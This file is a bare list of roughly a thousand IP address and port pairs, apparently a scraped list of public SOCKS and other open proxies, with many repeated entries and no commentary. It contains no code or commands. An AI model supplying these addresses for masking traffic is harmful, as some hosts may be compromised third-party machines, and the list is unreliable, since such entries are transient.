184.170.248.5:4145
103.14.251.16:4153
37.44.238.2:52611
92.205.61.38:56139
161.97.147.193:2838
67.227.186.23:57676
128.199.221.91:49865
207.180.198.241:37443
162.144.121.232:16795
207.180.198.241:45718
162.254.38.202:24000
178.79.165.164:38116
142.54.239.1:4145
203.96.177.211:61051
148.72.215.79:13305
213.14.31.123:35314
185.23.118.252:61091
107.180.90.42:10670
82.193.103.54:5678
198.12.253.1:62302
27.147.221.140:5678
213.21.56.20:4153
162.241.79.22:64619
50.63.12.33:46599
207.244.229.34:2275
92.205.61.38:36073
92.205.61.38:24663
188.164.193.178:53565
194.233.78.142:43923
167.86.69.142:45364
192.64.115.90:39948
148.72.215.79:13305
194.163.129.90:63957
159.223.71.71:51935
81.199.14.17:1088
103.111.219.154:4145
162.214.90.49:44916
107.180.91.248:40957
92.205.61.38:4300
188.164.196.31:53276
103.113.71.230:1080
206.189.145.23:49310
51.15.254.129:16379
128.199.221.91:8004
109.167.134.253:44788
166.62.38.100:2453
148.72.211.168:59828
102.69.177.242:10081
94.23.220.136:29295
159.223.166.21:25154
50.63.13.3:50887
51.75.71.110:57130
92.204.134.38:51123
162.241.46.6:53477
94.131.107.45:1080
103.19.58.84:4145
162.144.36.208:27531
186.235.184.9:4153
67.205.177.122:10250
192.169.226.96:46191
107.180.92.72:48478
50.63.12.33:61464
50.63.12.33:40838
162.241.53.72:57495
162.241.137.197:32145
82.223.121.72:4985
45.117.179.179:3547
162.240.22.184:48026
51.222.241.157:43254
198.57.229.184:2323
177.72.113.225:31164
98.162.25.4:31654
146.120.160.148:5678
146.59.18.246:40975
164.92.86.113:50393
54.36.122.16:17188
92.255.190.41:4153
177.8.170.122:1080
152.228.134.212:3585
80.65.28.57:30924
132.148.128.8:7392
54.36.108.149:16506
54.36.122.16:39713
194.163.129.90:43076
109.224.12.170:52015
190.0.15.18:5678
92.204.134.38:28695
175.100.47.191:5678
147.124.212.31:55361
162.241.46.69:62797
51.75.126.150:51713
186.10.102.218:5678
109.238.12.156:24586
167.86.69.142:45364
45.81.232.17:59421
45.81.232.17:61553
37.32.98.160:54647
104.238.111.107:53777
138.68.155.22:3467
163.172.149.133:16379
43.129.195.235:443
18.130.220.28:8193
94.40.127.166:4145
138.36.150.13:1080
142.54.228.193:4145
8.130.34.44:8081
94.181.33.149:40840
192.111.134.10:4145
162.144.36.208:52517
173.224.20.136:5678
43.248.27.11:54730
77.238.79.111:5678
93.182.76.244:5678
105.29.93.193:4145
202.151.163.10:1080
85.100.40.12:5678
103.60.137.17:4153
101.2.166.218:1088
65.49.67.161:48324
113.53.29.228:13629
77.46.138.1:33608
196.29.231.1:4145
98.181.137.80:4145
181.209.96.226:4153
118.173.230.19:1080
213.172.89.227:4153
103.124.137.251:1080
115.75.163.225:5678
183.88.240.139:4153
12.158.87.26:39593
86.110.189.118:42539
51.222.241.8:37963
190.2.115.33:4153
24.249.199.12:4145
194.44.166.65:1080
58.75.126.235:4145
103.225.221.18:5678
222.165.234.147:52667
101.51.121.141:4153
51.222.241.8:49559
216.169.73.65:60221
107.181.168.145:4145
92.204.134.38:1555
187.188.131.169:1080
212.69.128.72:5678
166.62.88.163:16119
186.219.96.47:49923
51.15.21.216:51448
92.204.134.38:52929
51.79.87.144:30464
91.201.240.84:5678
190.14.5.162:5678
164.92.86.113:52494
51.38.63.124:27294
80.122.170.182:4153
188.164.196.30:62564
103.144.18.202:1080
198.12.255.193:22785
146.59.18.246:28596
92.204.134.38:42674
92.204.135.203:10824
103.17.90.6:5678
147.124.212.31:16844
27.65.114.5:1080
146.59.18.246:64741
147.124.212.31:17740
192.64.115.90:25462
162.214.170.144:37592
174.136.57.169:30453
165.227.104.122:29992
132.148.167.243:61907
118.173.230.149:1080
37.187.73.7:41385
104.37.12.129:1080
148.72.23.56:36111
162.241.46.54:53783
88.202.230.103:39647
50.63.13.3:50887
152.228.134.212:3585
188.173.14.99:36835
67.205.177.122:21108
184.168.121.153:28632
209.14.112.7:1080
162.144.103.99:2291
51.38.63.124:10983
109.238.12.156:53938
51.222.241.8:62916
72.167.222.113:12581
162.214.170.144:16684
165.227.104.122:41443
80.241.44.34:5678
88.202.230.103:46475
162.214.121.173:44826
46.219.1.5:5678
82.223.121.72:64871
162.240.231.211:46637
67.227.186.83:63716
192.169.226.96:50578
162.214.90.49:32207
135.148.10.161:41146
166.62.38.100:42126
38.127.172.137:47421
67.205.177.122:64131
165.227.196.37:53718
162.215.219.157:48117
54.36.122.16:39713
107.180.92.72:48478
154.12.253.232:64196
65.49.82.7:58195
139.162.238.184:32964
141.95.160.178:23062
178.79.165.164:35254
159.223.166.21:57225
142.93.66.245:23742
176.192.65.34:5020
207.244.229.34:7976
146.59.18.246:49871
5.252.23.249:1080
64.227.108.182:37220
94.23.252.168:9180
104.238.111.107:29015
92.205.110.118:42086
50.63.13.3:55749
162.240.147.141:33894
92.204.134.38:25825
132.148.167.243:31139
198.12.253.239:38588
45.189.151.19:33333
92.204.135.37:26545
162.241.53.72:57314
144.91.66.30:21422
132.148.245.247:31406
181.209.82.154:14888
92.204.134.38:56177
70.35.213.226:4153
98.103.88.158:46104
192.163.201.131:40886
95.216.224.61:59792
180.173.214.235:4145
162.214.197.102:58740
51.79.87.144:41746
188.164.196.30:64988
94.198.215.22:52477
179.1.131.1:4145
200.41.182.243:4145
189.29.143.202:4153
5.58.47.25:3629
92.205.110.47:14936
212.69.128.72:5678
139.162.238.184:60708
107.180.90.248:8784
185.132.1.221:4145
50.63.13.3:40129
128.199.165.63:33574
103.164.190.221:5430
146.120.160.148:5678
91.185.236.239:4145
162.241.53.72:30828
162.214.102.195:60891
198.12.255.193:47365
132.148.245.169:49824
192.169.244.80:41568
103.70.206.129:59311
92.255.190.41:4153
162.241.79.22:32371
103.115.20.35:5678
162.241.45.22:34861
103.234.24.40:5678
159.223.71.71:62572
189.201.191.69:4145
50.207.130.238:54321
94.247.241.70:51006
191.7.208.101:31576
92.255.164.166:4145
89.41.106.8:4145
170.246.85.107:37163
222.165.223.140:41541
36.89.229.97:50540
188.133.160.22:4145
36.92.81.181:4145
110.74.195.152:1080
109.232.106.150:52435
119.93.123.229:4145
162.214.197.102:46430
162.214.191.209:33977
164.92.86.113:54597
18.130.220.28:8193
18.130.220.28:8193
74.56.228.180:4145
176.197.103.58:4145
147.124.212.31:51825
144.76.96.180:5566
187.216.144.170:5678
91.92.78.207:4145
62.73.127.98:9898
199.102.104.70:4145
209.14.112.8:1080
66.228.33.190:32118
5.188.66.181:8088
37.18.73.60:5566
185.245.38.200:4145
132.148.16.169:11320
162.241.46.40:60708
162.241.45.22:33082
67.227.186.23:57676
159.203.5.54:58249
50.63.13.3:55749
123.253.124.28:5678
31.200.242.201:12196
103.35.189.217:1080
103.220.205.162:4673
192.64.115.90:25462
66.248.237.227:56740
144.91.66.30:27566
167.172.159.43:1162
162.241.53.72:30828
162.144.32.209:20147
107.180.88.173:59820
213.21.56.20:4153
94.23.220.136:50563
190.211.161.210:32410
94.23.252.168:9180
72.167.222.113:12581
88.202.230.103:39647
72.252.4.49:4145
162.214.121.11:60647
162.214.121.173:33572
162.241.45.22:44931
194.163.129.90:63957
96.70.52.227:48324
162.241.50.179:34099
18.130.220.28:8193
162.255.108.254:5678
137.184.182.145:49659
132.148.167.243:48298
50.63.13.3:60315
146.59.18.246:9986
192.162.232.15:1080
45.226.1.1:4153
194.163.129.90:43076
107.180.103.214:13286
146.59.70.29:8446
132.148.16.169:55610
37.187.91.192:27898
50.63.12.101:17559
194.163.159.93:35081
132.148.167.243:41644
198.12.255.193:53281
162.241.46.69:46849
82.223.121.72:64871
50.63.12.33:31785
147.124.212.31:4671
103.148.211.96:1080
206.189.145.23:59867
27.123.3.141:4145
67.205.177.122:61942
67.205.177.122:53344
107.180.88.173:35774
166.62.38.100:2522
45.128.135.255:1080
45.117.179.179:55606
162.214.197.102:57785
109.232.106.150:52435
94.23.220.136:63665
198.12.255.193:22785
177.128.44.129:31337
166.62.88.163:26190
159.223.166.21:45537
51.75.71.110:11507
159.223.71.71:60377
92.204.134.38:28695
50.63.12.101:2953
104.238.111.107:45883
38.127.172.137:47421
188.75.186.152:4145
164.92.86.113:63536
162.214.102.195:50366
37.18.73.60:5566
151.236.39.7:58111
209.126.104.38:39369
94.23.220.136:59161
208.109.13.93:53778
172.93.111.235:25485
139.162.238.184:39652
45.81.232.17:33549
198.89.91.90:5678
162.240.231.211:46637
162.214.163.137:7484
62.109.0.18:24101
162.214.197.102:51918
104.248.151.220:53177
103.74.227.130:56417
187.95.82.254:3629
87.238.192.204:30068
51.89.21.99:16257
178.128.82.105:33702
188.164.193.178:53565
50.63.12.33:62592
165.227.196.37:61899
135.148.10.161:60415
159.223.71.71:57206
82.223.121.72:54368
72.206.181.97:64943
66.248.237.179:56740
92.204.134.38:34261
198.12.253.239:36895
162.240.73.148:52829
86.110.189.118:42539
107.180.103.214:61634
92.204.134.38:43044
166.62.88.163:49263
162.214.170.144:33394
37.187.91.192:11721
92.204.135.203:10824
24.37.245.42:51056
188.164.196.31:49426
45.187.71.208:5678
51.89.173.40:27887
50.63.13.3:28732
162.241.46.69:58330
166.0.232.122:29568
188.164.193.178:2592
46.226.148.105:9352
164.92.237.188:59045
162.214.154.138:32753
188.164.197.178:4026
104.251.212.206:34012
159.223.71.71:51935
184.168.121.153:41243
162.214.170.144:34617
104.244.75.78:31534
162.241.53.72:30828
209.126.104.38:44412
188.165.252.198:27203
161.97.74.176:30000
128.199.221.91:64579
51.79.87.144:22500
91.185.236.239:4145
132.148.128.8:54459
148.72.215.79:11423
92.204.134.38:59727
107.180.88.173:59609
172.93.111.87:25485
208.109.13.93:56231
184.170.245.148:4145
66.228.33.190:17464
107.180.88.173:30125
172.93.111.87:40166
24.75.156.114:3366
67.205.177.122:14108
188.164.196.31:56392
109.238.12.156:11453
103.215.139.32:38108
15.235.187.227:62640
207.244.254.30:16491
162.214.121.173:35183
164.92.86.113:60312
159.223.71.71:59159
27.147.221.140:5678
192.163.202.88:64649
51.75.125.208:40998
163.172.129.251:16379
194.163.129.90:43076
72.37.217.3:4145
67.227.186.23:57676
147.124.212.31:50460
185.139.56.133:4145
167.172.159.43:1162
67.205.177.122:10250
188.93.230.17:59014
194.163.129.90:63957
46.109.146.244:4145
160.153.245.187:2287
84.52.123.163:4145
161.97.173.78:39820
50.63.13.3:60315
162.241.6.97:33098
50.63.12.33:14738
192.163.202.88:19045
46.219.1.5:5678
162.241.46.54:62797
92.249.122.108:58749
67.227.186.23:64153
92.204.136.149:9328
51.161.99.114:29758
107.180.89.185:27558
195.16.153.36:53403
104.238.111.107:60214
144.76.96.180:5566
162.240.72.139:25591
139.162.238.184:54627
194.163.159.93:15816
62.73.127.98:9898
147.124.212.31:17740
64.227.108.182:14287
135.148.10.161:52506
54.36.122.16:44587
144.76.96.180:5566
162.241.50.179:35948
75.119.145.169:61344
162.241.79.22:59219
51.38.27.158:55583
92.205.60.110:23293
159.223.71.71:57206
103.18.47.79:4145
51.38.63.124:27294
51.15.234.222:16379
83.220.46.106:4145
132.148.16.169:11320
162.241.46.40:49401
107.180.88.173:44568
92.205.110.118:9645
162.241.45.22:33082
31.200.242.201:15755
94.131.14.66:1080
92.204.134.38:1555
92.205.110.47:42356
159.89.194.121:8738
162.214.121.11:18809
185.18.198.163:55108
188.164.197.178:11925
45.81.232.17:33549
185.18.198.163:58714
45.81.232.17:23363
85.25.177.53:55217
138.68.155.22:15537
208.109.14.49:11426
50.63.13.3:50887
206.189.184.213:35398
154.12.255.155:64560
162.0.220.234:57020
50.63.13.3:16683
37.187.91.192:17605
152.228.140.225:64251
45.6.94.159:4153
161.97.147.193:12762
130.255.162.199:52039
72.49.49.11:31034
37.187.91.192:21981
174.64.199.82:4145
72.195.34.58:4145
181.205.190.52:4153
50.238.47.86:32100
51.91.13.215:55637
192.158.15.201:50877
213.19.205.18:54321
186.190.228.83:4153
146.59.18.246:20734
92.205.61.38:4726
85.25.177.53:55217
195.138.65.34:5678
83.56.15.57:5678
37.26.86.206:4145
87.238.192.249:51484
77.238.79.111:5678
188.163.170.130:35578
177.66.221.255:5678
185.226.113.180:38030
213.16.81.182:35559
185.151.146.178:1234
130.255.162.199:20398
194.163.129.90:63957
109.232.106.150:52435
185.43.189.182:3629
88.204.216.142:33156
12.158.87.26:39593
146.59.18.246:40975
213.172.89.227:4153
184.178.172.17:4145
129.205.244.158:1080
91.213.119.246:46024
202.151.163.10:1080
94.247.241.70:51006
91.247.250.215:4145
176.99.2.43:1080
202.131.246.250:5678
178.220.148.82:10801
45.234.100.102:1080
64.64.152.248:39593
38.50.130.93:5678
188.95.20.139:5678
103.127.23.10:5678
114.4.241.210:5678
123.253.124.28:5678
14.241.182.44:5678
154.79.242.178:10801
95.178.108.189:5678
116.118.98.26:5678
51.68.164.77:16664
200.85.52.254:5678
177.136.124.36:3629
185.97.114.179:3629
181.129.74.58:30431
190.104.26.227:33638
18.130.220.28:8193
18.135.211.182:3128
3.10.93.50:3128
18.135.133.116:80
18.169.83.87:1080
12.218.209.130:13326
91.201.240.84:5678
107.181.168.145:4145
46.182.6.69:56819
104.200.135.46:4145
162.241.45.22:34861
92.204.134.38:56177
166.62.38.100:56191
108.175.24.1:13135
165.227.104.122:41443
162.214.197.102:57785
37.187.91.192:27898
5.135.137.13:59124
24.249.199.12:4145
65.169.38.73:26592
162.214.121.173:38516
201.184.159.28:5678
207.180.198.241:35119
147.182.194.76:29703
147.124.212.31:24230
31.24.44.92:50687
50.63.12.33:23065
51.15.21.216:51448
166.62.36.126:45982
188.164.196.30:62105
162.214.90.49:59997
190.14.155.198:5678
66.29.131.58:30060
162.214.121.173:41326
192.99.207.129:29360
66.248.237.227:56740
207.244.229.34:7976
66.228.35.209:46695
165.227.196.37:53718
64.202.186.2:63998
162.214.102.195:56051
72.167.221.145:50335
109.69.0.179:5678
31.43.33.55:4153
104.37.135.145:4145
58.75.126.235:4145
212.31.100.138:4153
184.170.248.5:4145
186.159.3.193:45524
178.250.70.218:1088
167.172.159.43:1162
193.158.12.138:4153
91.201.240.84:5678
192.162.232.15:1080
187.252.154.90:4153
142.54.232.6:4145
93.90.212.2:4153
137.184.182.145:49659
132.148.16.169:52326
178.72.90.70:5678
24.37.245.42:51056
91.201.240.84:5678
92.205.61.38:56139
66.248.237.179:56740
166.62.38.100:2522
91.199.139.246:1111
18.130.220.28:8193
38.242.136.254:15625
164.92.86.113:54597
209.14.112.2:1080
176.77.9.22:5678
37.228.65.107:51032
72.37.217.3:4145
132.148.167.243:41644
41.184.212.3:4153
173.224.20.136:5678
12.158.87.26:39593
54.36.122.16:44587
54.36.122.16:29796
162.214.121.173:41326
200.115.96.65:4145
46.219.1.5:5678
54.36.122.16:39713
27.79.88.138:5302
192.111.135.17:18302
49.229.36.172:4153
92.204.135.203:13922
146.59.18.246:49871
92.205.61.38:29249
209.126.104.38:30632
209.14.112.10:1080
50.63.12.33:31785
162.144.36.208:52517
107.180.88.173:44568
91.203.114.71:42905
159.224.243.185:61303
166.62.38.100:4765
100.1.53.24:5678
98.170.57.249:4145
51.38.63.124:27294
195.74.72.111:5678
209.222.97.30:16366
107.180.101.226:49590
159.223.166.21:49174
213.165.185.211:4153
92.204.134.38:25675
182.253.71.122:5678
31.200.242.201:12196
51.89.173.40:51612
185.97.114.179:3629
159.89.194.121:8738
148.72.23.56:60069
188.166.234.144:19738
148.72.215.79:47202
162.241.6.97:33098
162.55.87.48:5566
72.195.34.35:27360
109.68.189.22:54643
103.148.45.167:4145
91.185.236.24:4145
38.133.200.94:31596
45.6.101.97:4153
198.57.229.185:64767
45.81.232.17:24079
104.238.111.107:26305
130.255.162.199:12703
67.227.186.83:63716
162.214.154.178:43581
109.248.236.150:9898
217.27.149.190:4153
183.88.212.167:4153
146.59.18.246:40975
185.18.198.163:55108
92.205.110.118:18030
37.18.73.60:5566
188.164.197.178:11925
217.145.199.47:56746
51.68.164.77:16664
109.167.134.253:44788
166.62.38.100:32216
188.164.193.178:2592
162.214.102.195:56755
185.51.92.84:51327
192.64.115.90:25462
178.79.165.164:7377
165.227.196.37:63399
92.204.134.38:51123
164.92.86.113:63536
103.168.254.134:1080
162.241.137.197:32145
66.228.37.252:46648
148.72.23.56:42312
161.97.163.52:26358
50.63.12.33:23065
162.214.75.79:52163
132.148.16.169:27399
150.220.8.228:64312
207.244.254.30:49833
167.86.69.142:42214
92.205.110.118:42086
64.124.191.98:32688
165.227.196.37:56755
190.145.58.106:5678
184.178.172.5:15303
92.205.110.118:7895
92.205.61.38:4300
177.66.221.255:5678
135.148.10.161:31696
138.68.155.22:34640
216.215.125.178:48324
81.12.169.254:4153
162.241.46.6:46097
37.187.141.160:28343
162.214.102.195:50366
1.20.169.33:4145
162.241.46.54:53783
92.205.107.159:55495
162.144.32.209:20147
162.240.19.133:46810
5.178.217.227:31019
103.174.236.98:8080
65.49.82.7:58195
5.58.47.25:3629
135.148.10.161:5607
177.74.200.69:5678
132.148.128.8:22115
78.128.8.156:46485
103.148.130.5:1080
139.162.238.184:32964
91.199.93.32:4153
92.205.110.118:49586
208.109.14.49:63470
162.214.191.209:60768
95.128.142.76:1080
192.162.232.15:1080
199.58.184.97:4145
148.72.23.56:30845
132.148.167.243:48298
50.63.12.33:14738
194.163.129.90:43076
92.205.61.38:64272
162.214.121.173:33572
51.158.125.135:16379
202.40.178.34:5678
147.124.212.31:33526
207.180.198.241:17228
31.169.79.37:1080
162.241.46.40:60102
161.97.173.78:17732
92.205.60.110:28681
209.126.104.38:12457
178.212.48.84:1080
103.235.66.198:5678
132.148.245.169:38117
92.205.61.38:36073
213.136.75.85:57607
185.79.243.153:38431
192.141.236.3:5678
162.241.46.40:60708
162.214.170.144:31701
45.81.232.17:61553
132.148.245.247:60349
36.89.10.51:44268
202.40.186.66:1088
104.248.158.78:62952
51.89.173.40:44719
54.36.108.149:37947
164.163.21.14:8291
103.158.253.191:1080
174.77.111.198:49547
192.99.207.129:29360
146.59.18.246:9755
72.37.216.68:4145
188.164.197.178:45013
67.227.186.23:57676
92.205.110.118:5513
162.144.36.208:38242
192.163.200.80:22472
109.123.254.43:51888
192.163.201.131:40886
51.15.205.223:16379
88.202.230.103:39647
50.63.13.3:16683
103.215.139.32:38108
194.233.78.142:34471
124.67.67.17:5678
159.223.166.21:47460
67.205.177.122:61942
50.63.12.33:61464
66.248.237.89:41176
92.205.61.38:48664
45.81.232.17:24803
162.214.121.173:31179
171.244.140.160:46523
162.214.121.173:62976
1.212.157.114:4145
162.241.50.179:40179
107.181.168.145:4145
103.148.211.96:1080
54.36.122.16:29796
208.109.13.93:56231
78.83.242.229:4145
162.214.90.49:57785
162.241.50.179:35948
200.105.192.6:5678
139.162.166.167:46795
162.241.46.6:50062
213.32.252.134:5678
45.187.71.208:5678
178.79.165.164:35254
144.76.96.180:5566
88.202.230.103:13638
184.170.245.148:4145
194.163.159.93:15816
198.89.91.90:5678
199.58.185.9:4145
94.232.11.178:58028
138.0.207.18:38328
202.131.159.58:5678
91.219.88.121:47334
51.15.21.216:51448
138.255.240.66:40736
89.187.216.58:1080
50.207.130.198:54321
173.224.20.136:5678
103.164.112.133:4145
109.238.12.156:53938
187.44.211.118:4153
46.173.35.229:3629
176.99.2.43:1080
41.169.151.154:4153
162.240.147.147:44487
162.214.75.79:52163
178.79.165.164:24324
8.42.68.125:39593
72.167.221.157:50824
94.23.220.136:22893
162.55.87.48:5566
146.59.70.29:22975
185.51.92.103:51327
209.126.104.38:16608
51.89.173.40:60775
162.214.121.173:38516
103.121.39.158:1080
209.14.112.6:1080
161.97.163.52:49493
162.241.53.72:45925
51.159.221.176:8635
159.192.121.240:4145
198.8.94.170:4145
185.129.250.183:32284
176.113.157.149:37417
45.81.232.17:53288
162.214.170.144:6984
185.196.176.77:4145
46.214.153.223:5678
198.12.253.239:36895
222.223.112.59:10800
173.212.209.49:18421
91.200.115.49:1080
37.18.73.60:5566
50.63.13.3:14920
50.63.12.33:25492
92.204.134.38:42674
66.228.37.252:46695
161.97.173.78:42782
162.241.45.22:60574
66.228.33.190:36702
159.223.71.71:59159
186.219.96.47:49923
103.53.110.45:10801
188.165.237.26:52982
188.164.196.30:62966
177.135.83.244:5678
82.200.81.4:1080
81.16.248.246:25566
159.148.146.65:5678
116.118.98.26:5678
159.223.166.21:57225
148.72.23.56:60069
182.53.216.4:4153
165.227.104.122:41443
162.214.197.102:51918
202.131.235.138:4153
192.163.200.93:22179
103.44.13.246:4145
190.3.72.38:3629
51.89.173.40:51612
45.187.76.2:3629
196.2.13.12:4153
208.109.14.49:22881
162.214.170.144:25347
162.214.154.178:32753
137.184.182.145:49659
114.4.241.210:5678
95.31.35.210:3629
162.214.121.173:64579
213.14.31.123:35314
163.172.158.70:16379
24.75.156.114:3366
103.18.47.79:4145
147.124.212.31:55361
92.205.28.245:53287
162.0.220.234:57020
162.241.45.22:30747
185.32.4.110:4153
162.214.154.141:43581
166.62.85.184:21946
147.124.212.31:17740
192.169.214.249:45108
162.241.53.72:53755
162.241.50.179:53755
84.52.123.163:4145
162.144.103.99:2291
51.161.33.206:29360
130.255.162.199:52039
106.240.89.60:4145
146.59.18.246:9986
166.62.36.126:45982
209.222.97.30:15805
162.214.102.195:56051
67.205.177.122:61942
103.164.190.221:5430
18.130.220.28:8193
212.156.217.147:4153
195.168.91.238:4153
201.159.103.97:31337
31.43.33.56:4153
190.216.56.1:4153
162.241.70.64:60294
186.10.102.218:5678
198.12.253.239:38588
109.69.0.179:5678
190.108.84.168:4145
138.68.155.22:44660
164.92.86.113:52494
38.50.130.93:5678
103.14.251.16:4153
207.244.229.34:7976
188.164.197.178:45013
79.106.34.6:4145
43.248.25.6:4145
85.237.62.189:3629
82.223.121.72:63596
84.2.239.42:4153
181.129.62.2:47377
192.163.200.82:11720
147.182.194.76:29703
138.197.92.110:4527
36.95.231.205:5678
162.214.170.144:47558
109.238.12.156:24586
72.195.34.58:4145
24.37.245.42:51056
103.127.23.10:5678
166.62.38.100:42126
77.238.79.111:5678
50.250.56.129:9898
162.240.22.184:43494
45.81.232.17:41792
187.210.136.88:4153
162.214.90.49:58740
162.214.90.49:59997
107.180.101.18:19512
67.205.177.122:14108
36.92.166.196:1080
31.131.199.127:3629
67.205.177.122:64131
178.79.165.164:7377
113.160.106.45:4153
162.214.102.195:50366
188.165.252.198:5132
51.75.71.110:47503
91.187.55.39:5678
161.97.147.193:7518
177.73.248.26:55290
67.205.177.122:10250
124.158.144.186:1080
162.241.79.22:38526
1.20.227.66:4145
198.12.255.193:22785
217.145.199.47:56746
91.205.131.110:53339
51.158.78.200:16379
148.66.130.187:16320
46.182.6.69:56819
103.120.146.32:5678
51.222.241.157:43254
50.63.12.33:31785
104.238.111.107:56225
159.223.166.21:5199
109.238.12.156:26912
192.169.205.131:38981
72.252.4.49:4145
103.40.122.194:1080
113.11.131.146:5678
1.179.151.165:31948
213.136.78.200:58283
142.54.232.6:4145
154.79.246.18:9898
67.205.177.122:48949
162.214.121.173:41326
72.167.222.102:9493
162.240.10.35:46810
132.148.167.243:61907
185.109.184.150:63819
92.204.135.203:29212
160.153.245.187:2287
176.77.9.22:5678
192.163.201.131:10185
66.228.35.209:46648
137.184.182.145:56363
192.169.226.96:32074
72.195.114.169:4145
50.62.58.158:34018
159.223.166.21:1372
144.91.66.30:27566
93.175.194.154:3629
46.219.1.5:5678
80.92.227.185:5678
172.93.111.87:40166
89.151.251.50:32000
192.169.226.96:46191
198.12.255.193:53281
194.163.159.93:35081
164.92.86.113:50393
188.164.193.178:19434
194.233.78.142:41720
51.68.164.77:16664
41.223.108.13:1080
162.241.53.72:34099
185.161.186.133:54321
152.228.140.225:44664
202.40.186.26:1080
161.97.173.78:49145
190.104.213.175:1080
46.188.104.108:1080
69.36.63.128:1080
18.130.220.28:8193
62.103.186.66:4153
110.74.195.152:1080
92.204.134.38:54467
92.204.134.38:34261
185.95.199.103:1099
132.148.16.169:55610
184.170.248.5:4145
91.201.240.84:5678
159.148.146.65:5678
159.223.71.71:60512
192.162.232.15:1080
67.205.177.122:53344
62.85.224.217:5678
27.65.114.5:1080
162.240.21.140:30097
46.188.2.42:5678
202.162.212.165:4153
104.238.111.107:7999
192.163.200.80:22472
50.192.49.195:32100
164.92.86.113:52494
44.226.167.102:80
192.169.226.96:50578
148.72.209.174:4734
95.31.35.210:3629
1.179.172.45:31225
104.238.111.107:60214
92.204.134.38:34261
188.165.252.198:10661
162.241.50.179:62192
37.18.73.60:5566
91.200.114.58:55749
200.85.52.254:5678
195.74.72.111:5678
92.255.190.64:4153
109.167.113.12:4153
92.204.134.38:56177
185.40.80.143:4153
185.18.198.163:58714
162.55.87.48:5566
193.106.57.96:5678
146.59.70.29:15259
181.143.21.146:4153
50.63.12.33:25492
94.23.220.136:35312
181.143.21.146:4153
54.36.122.16:29796
195.140.226.32:5678
192.163.200.80:61437
184.168.121.153:28632
174.136.57.169:30453
103.116.174.125:5678
82.193.103.54:5678
46.219.1.5:5678
188.166.234.144:19738
95.31.42.199:3629
162.0.220.222:57020
92.205.107.159:55495
110.164.241.194:4153
208.109.13.93:53778
92.204.134.38:25825
162.241.50.179:37876
72.167.222.113:41629
64.202.186.2:20189
137.184.182.145:49659
185.190.90.2:4145
192.169.226.96:32074
51.222.241.8:62916
111.68.31.134:40385
197.211.24.206:5678
162.241.53.72:30828
162.214.102.195:56755
207.180.198.241:37209
162.240.10.35:46810
103.53.110.45:10801
36.37.189.64:5678
159.223.71.71:51935
159.223.166.21:5078
109.167.134.253:44788
160.153.254.240:57469
172.93.111.87:40166
162.241.46.6:56241
94.23.220.136:7811
144.76.96.180:5566
85.116.120.106:3629
166.62.88.163:26190
96.70.52.227:48324
192.99.207.129:26567
161.97.163.52:4458
162.241.79.22:64619
167.86.69.142:44439
213.136.78.200:7412
178.128.82.105:33702
132.148.167.243:27019
113.160.106.45:4153
116.50.174.181:17066
51.158.78.200:16379
207.180.198.241:35119
67.205.177.122:21108
198.12.253.1:62302
109.87.172.133:5678
201.144.8.115:5678
185.245.38.200:4145
162.214.170.144:39503
162.214.162.156:46369
179.48.155.152:4153
50.63.12.33:31785
171.244.140.160:62102
93.175.194.155:3629
162.241.46.6:61579
162.241.50.179:62192
160.153.245.187:5436
104.251.212.206:34012
200.108.190.185:9800
162.240.208.98:43704
92.204.134.38:52929
178.212.48.84:1080
188.164.193.178:53565
92.205.110.47:16865
148.72.23.56:36111
103.35.189.217:1080
198.57.229.185:64767
36.64.62.111:5678
103.148.45.167:4145
164.92.86.113:50393
146.120.160.148:5678
192.64.115.90:25462
5.252.23.220:1080
103.134.214.131:1648
194.163.159.93:35081
109.123.254.43:51888
178.250.70.218:1088
107.180.88.173:44568
194.233.78.142:41720
51.15.132.215:16379
66.248.237.227:56740
162.214.121.173:35183
165.227.104.122:29992
207.244.254.30:46138
51.75.71.110:12097
66.228.35.209:46648
186.190.228.83:4153
193.8.87.57:4444
132.148.245.169:19483
50.63.12.33:23065
137.184.182.145:9338
103.123.70.83:5678
189.50.138.10:5678
107.180.92.72:48478
92.204.134.38:42571
148.72.209.174:31590
162.241.46.69:34236
72.167.220.46:28810
72.167.222.113:12581
132.148.128.8:22773
164.92.86.113:55651
88.202.230.103:13638
72.167.222.113:4125
198.12.253.239:36895
101.96.117.164:1080
113.71.148.10:1080
146.59.18.246:20734
195.164.138.34:1080
103.134.214.131:1648
88.202.230.103:39647
50.63.13.3:50887
132.148.128.8:7392
188.243.99.234:1080
173.212.209.49:13025
36.95.13.18:5678
148.72.215.230:35727
66.228.35.209:19497
103.215.72.115:5678
212.115.232.79:10800
92.204.134.38:59727
209.222.97.30:40166
104.238.111.107:26305
132.148.167.243:59808
107.180.103.214:45870
103.140.35.11:4145
103.111.160.41:5678
51.222.241.157:43254
54.36.122.16:39713
213.14.31.123:35314
162.241.45.22:63501
166.62.88.163:49263
125.26.4.197:4145
104.251.212.206:50805
103.221.254.59:1088
192.163.202.88:64649
164.92.237.188:53364
212.102.103.134:4153
147.124.212.31:55361
162.240.22.169:34157
80.241.44.34:5678
152.228.140.225:45636
162.214.197.102:42019
67.227.186.83:63716
213.136.79.177:5189
152.228.134.212:3585
186.96.124.242:4153
107.180.88.173:35774
92.205.110.47:50709
194.233.78.142:46115
185.23.118.252:61091
161.97.163.52:26358
38.133.200.94:31596
130.255.162.199:52039
162.240.19.133:56483
159.223.71.71:56127
217.27.149.190:4153
31.200.242.201:12196
95.216.224.61:59792
178.79.165.164:38116
148.72.206.84:30651
107.180.88.173:44568
103.112.234.113:5678
51.158.77.220:16379
78.128.81.220:44286
91.187.55.39:5678
54.36.108.149:16506
163.172.169.27:16379
213.136.79.177:22680
94.23.220.136:19547
202.180.20.114:1080
167.86.69.142:45364
104.248.151.220:51040
103.234.24.40:5678
162.214.121.173:44826
162.241.46.54:34236
190.104.213.175:1080
103.121.195.12:61221
103.144.209.104:3629
103.121.39.158:1080
187.58.135.42:5678
103.220.205.162:4673
66.228.33.190:17464
72.167.222.113:39574
159.223.166.21:49174
104.251.212.206:34012
109.238.12.156:26912
150.220.8.228:64312
132.148.128.8:28484
142.54.229.249:4145
132.148.167.243:59808
135.148.10.161:6716
138.59.177.117:5678
124.158.182.34:10808
139.255.132.68:1080
131.0.246.113:4153
162.240.73.148:52829
162.214.163.137:7484
135.148.10.161:51507
18.130.220.28:8193
174.136.57.169:30453
181.48.193.42:2580
198.57.229.185:45190
185.22.8.70:1080
185.95.199.103:1099
185.139.56.133:4145
209.222.97.30:16366
181.129.62.2:47377
181.209.103.98:5678
176.120.32.135:5678
177.128.44.130:31337
192.162.232.15:1080
177.104.87.23:5678
192.163.202.88:64649
177.8.170.122:1080
185.226.113.180:38030
